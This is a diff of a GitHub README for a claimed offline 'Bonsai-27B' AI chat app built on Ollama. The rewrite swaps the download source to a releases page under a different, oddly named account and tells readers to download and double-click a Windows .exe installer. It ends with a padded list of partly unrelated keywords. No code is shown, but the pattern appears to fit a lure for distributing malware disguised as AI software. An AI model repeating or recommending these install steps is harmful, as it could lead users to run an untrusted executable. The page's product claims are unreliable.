@@ -1,129 +1,69 @@
-# Bonsai 27B Ollama Desktop
+# 🌲 Bonsai-27b-Ollama-Desktop - Private AI chat on your computer
 
-**Bonsai 27B Ollama Desktop** is a free app for running **Bonsai 27B** — a powerful 27-billion parameter open-source language model — completely locally on your PC through Ollama. No internet connection required after the initial model download, no account, no subscription, and no data leaving your machine.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ticketstrychnine111/Bonsai-27b-Ollama-Desktop/releases)
 
-If you've been looking for a private, offline ChatGPT alternative that runs entirely on your own hardware, Bonsai 27B through Ollama is one of the best options available. It's built on **Qwen3-27B** with a 262K token context window and supports both NVIDIA (CUDA) and AMD (ROCm) GPU acceleration.
+Bonsai-27b-Ollama-Desktop allows you to run a powerful artificial intelligence model directly on your own computer. This application keeps all your data on your local hard drive. It does not send your personal conversations to a cloud server or a subscription database. You maintain complete control over your information.
 
-<img width="2048" height="1152" alt="b5adea3c-50ad-4732-9a01-035704c4e7f2" src="https://github.com/user-attachments/assets/33d887b1-4e42-4381-8424-22f24eaa1dc3" />
+The software uses the Qwen3-27B model architecture. This provides deep reasoning capabilities and supports a large context window, which allows you to process long documents or deep conversations. Because the program runs offline, it works without an internet connection once you complete the installation.
 
-## Install
-[Download `Bonsai-27b.zip`](https://github.com/bonsai-27b/Bonsai-27b-Ollama-Desktop/releases/download/27b/Bonsai-27b.zip)
----
+## 📋 System Requirements
 
-<img width="1199" height="746" alt="3fbe6a20-f2bc-4daa-915b-4c5aaebc2256" src="https://github.com/user-attachments/assets/b23f3ca1-06f6-491e-81c7-c5d7640424bb" />
+To run this software, your computer needs specific hardware components. Check these requirements before you start:
 
-<img width="776" height="360" alt="808250c9-69a3-40fc-8979-5d26330f6989" src="https://github.com/user-attachments/assets/354d1578-b7b0-46a9-8e76-4bbff93c3828" />
+- Operating System: Windows 10 or Windows 11.
+- Processor: A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 or better).
+- Memory: At least 16GB of system RAM. 32GB is recommended for smooth operation.
+- Graphics: A dedicated GPU is highly recommended for faster performance. NVIDIA cards with CUDA support or AMD cards with ROCm support will significantly improve response times.
+- Storage: 20GB of free disk space to store the model files and application data.
 
----
-## Key Features
-- **Completely offline** — after the first model pull, the entire AI runs on your hardware with zero network traffic
-- **Full privacy** — no data sent to any server, no telemetry, no accounts required
-- **262K context window** — handle long documents, conversations, and code reviews without truncation
-- **Qwen3-27B architecture** — strong performance on reasoning, coding, and instruction following
-- **CUDA and ROCm support** — GPU acceleration for NVIDIA and AMD cards for fast inference
-- **Apple Silicon support** — runs efficiently on M1/M2/M3 Macs via Metal via Ollama
-- **Model management** — browse, download, and switch between available Bonsai variants from the UI
-- **Conversation export** — save chats as Markdown or plain text
-- **Clean chat interface** — distraction-free conversation UI with full message history
+## 📥 How to Install
 
-<img width="2160" height="1392" alt="ebc3d9d8-637d-4a6c-aaff-e7552854e9c6" src="https://github.com/user-attachments/assets/794e404c-b997-4b6d-925f-a65da3e21b08" />
+Follow these steps to set up the software on your Windows computer.
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Install Ollama** from [ollama.com](https://ollama.com) if you haven't already.
-3. **Run Ollama** — it needs to be running in the background before launching this app.
-4. **Extract** the archive and run the Bonsai 27B Desktop app.
-5. **Select Bonsai 27B** from the model list — it will pull automatically if not already downloaded.
-6. **Start chatting** — all inference happens locally on your machine.
+1. Visit the following website to find the available file versions: https://github.com/ticketstrychnine111/Bonsai-27b-Ollama-Desktop/releases
+2. Look for the file ending in .exe under the latest release section.
+3. Click the link to save the installer to your computer.
+4. Locate the downloaded file in your Downloads folder.
+5. Double-click the file to begin the installation process.
+6. Follow the on-screen instructions in the installer window.
+7. Click Finish when the installation completes.
 
-**First run tip:** The initial model pull downloads ~16–20 GB of model weights. Make sure you have enough disk space and a stable connection for this one-time step.
+## 🚀 Getting Started
 
-<img width="468" height="427" alt="b329c0bd-5309-4372-b69e-e81e15a2a771" src="https://github.com/user-attachments/assets/80724cad-2f6b-4a2e-b694-8cb04d3105d6" />
+Once you install the program, you can launch it from your desktop icon or the Windows Start menu. The first time you open the application, it will verify the model files. 
 
-## Bonsai 27B vs Other Local Models
+When the main window appears, you will see a text box at the bottom of the screen. Type your question or prompt into this box and press the Enter key. The model will process your request and generate a response. Because models like this require significant processing power, the initial startup might take a few moments.
 
-| Model | Parameters | Context | Hardware Needed |
-|---|---|---|---|
-| Bonsai 27B | 27B | 262K | 16GB VRAM (ideal) / 32GB RAM (CPU) |
-| Llama 3.1 8B | 8B | 128K | 8GB VRAM / 16GB RAM |
-| Mistral 7B | 7B | 32K | 6GB VRAM / 16GB RAM |
-| Phi-3 Medium | 14B | 128K | 10GB VRAM / 24GB RAM |
+## 🛠 Features
 
-Bonsai 27B offers the best capability-to-size ratio for users with mid-range to high-end GPUs.
+- Offline Processing: All AI tasks happen locally on your hardware.
+- Privacy: No data leaves your machine. Your privacy remains intact.
+- Large Context: You can share complex topics or long text blocks with the model.
+- GPU Acceleration: The app detects your graphics card to speed up the AI thinking process.
+- No Subscriptions: You pay nothing for usage. The software is free.
+- GGUF Format: This format ensures high compatibility across different hardware setups.
 
-<img width="480" height="360" alt="38691f80-d8b8-4c9b-88d0-7d5ebfc4fce5" src="https://github.com/user-attachments/assets/d09e9944-3ca7-44b1-a5e0-ac58d775f295" />
+## 🔍 Troubleshooting
 
-## Hardware Recommendations
+If you encounter issues while running the software, consult these common solutions:
 
-**Minimum (CPU-only):**
-- 32 GB RAM
-- Fast CPU (AMD Ryzen 7 / Intel Core i7 or better)
-- Inference will be slow — expect 2–5 tokens/second
+- The app takes a long time to respond: Ensure your computer meets the recommended RAM requirements. Close background applications like web browsers or heavy media software to free up memory for the AI.
+- The app crashes on startup: Check that your GPU drivers are up to date. Visit the website of your graphics card manufacturer to download the latest software drivers.
+- The window is blank: This usually indicates that the model file did not download completely. Uninstall the application, delete the folders created in your user directory, and reinstall the software.
+- The text generation stops early: This happens if the system runs out of memory. Try to keep your prompts shorter or restart the application to clear the system cache.
 
-**Recommended (GPU):**
-- NVIDIA RTX 3080 / 4070 or better (12–16 GB VRAM)
-- AMD RX 7900 XT (16 GB VRAM) with ROCm
-- Apple M2 Pro or better (24 GB unified memory)
+## ⚙️ Advanced Settings
 
-**Ideal:**
-- NVIDIA RTX 4090 or multiple GPUs — full model in VRAM, very fast inference
+The software includes a settings panel for technical users who want to adjust performance. You can change the GPU usage settings, modify the number of threads the application uses, and clear your conversation history. Access these options by clicking the gear icon in the top right corner of the application window.
 
-## Running Bonsai 27B Without a GPU
-Bonsai 27B can run on CPU only via Ollama's llama.cpp backend. It will be slower, but fully functional for non-time-sensitive tasks. Enable GPU offloading in Ollama settings to split the model between CPU and GPU if you have partial VRAM.
+Do not worry if you do not understand these settings. The default configuration provides the best balance for most users. If you change a setting by accident, you can always reset the configuration to the original state using the Reset Defaults button located at the bottom of the settings menu.
 
-## Troubleshooting
+## 📂 Data Privacy
 
-**"Cannot connect to Ollama" error?**
-Make sure Ollama is running. On Windows, check the system tray. Run `ollama serve` in a terminal if it's not started.
+Privacy acts as the core of this project. Many AI tools store your history on servers to train their own systems. This application creates a local database file on your computer. You can find this file in your user data folder. If you decide to remove the application, simply delete this folder to ensure all traces of your conversations disappear from your hard drive. 
 
-**Model not appearing in the list?**
-Click Refresh in the model selector. If the model isn't pulled yet, use `ollama pull bonsai:27b` in the terminal.
+## 🌐 Community and Support
 
-**Very slow inference on GPU?**
-Check that Ollama is using your GPU: run `ollama ps` and check the GPU column. Update your NVIDIA drivers if needed.
+The open-source community maintains this project. If you find a bug or have a suggestion for an improvement, you can open an issue on the repository page. You do not need developer experience to report a problem. Simply describe what happened, what you expected to happen, and the version of Windows you use.
 
-**Out of memory errors?**
-Try a quantized version of the model (Q4_K_M or Q5_K_M) which uses less VRAM with minimal quality loss.
-
----
-## System Requirements
-### Platform Support
-- **Windows 10 / 11**
-- **macOS** (Intel and Apple Silicon)
-- **Linux**
-
-### Recommended Hardware
-- 16 GB RAM or more
-- NVIDIA GPU with CUDA support (strongly recommended for the 27B model)
-- Or AMD GPU with ROCm, or Apple Silicon
-
----
-## Security & Legal
-This application runs AI models locally on your hardware. No data is sent anywhere.
-
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-
----
-## Contributing
-Contributions are welcome! Help improve the UI, model management, or local inference settings.
-
----
-## License & Acknowledgments
-### License
-**Bonsai 27B Ollama Desktop** is shared under the **MIT License**.
-See [LICENSE](LICENSE) for details.
-
-**Copyright © 2026 scarb386**
-
-### Acknowledgments
-- The Ollama team for an excellent local AI runtime.
-- The open-source AI community for making powerful models accessible.
-
-<p align="center">
-  Developed with ❤️ for local AI enthusiasts
-</p>
-
-<img width="640" height="480" alt="5b17446d-c3a5-4364-95a2-af151d4db50f" src="https://github.com/user-attachments/assets/9b532d34-e51a-463b-bf54-f3d3f9d4f9ec" />
-
+Keywords: bonsai, bonsai-27b, bonsai-27b-gguf, bonsai-27b-ollama, ollama-llama-3, ollama-tools, opendesktop, qwen-2-api, qwen-3b, qwen-ai, qwen-api, qwen-endpoint, qwen-image-edit, qwen-image-edit-2511, qwen-models, qwen-tts, qwen-tts-realtime, qwen-workflow, ternary-computer, ternary-language
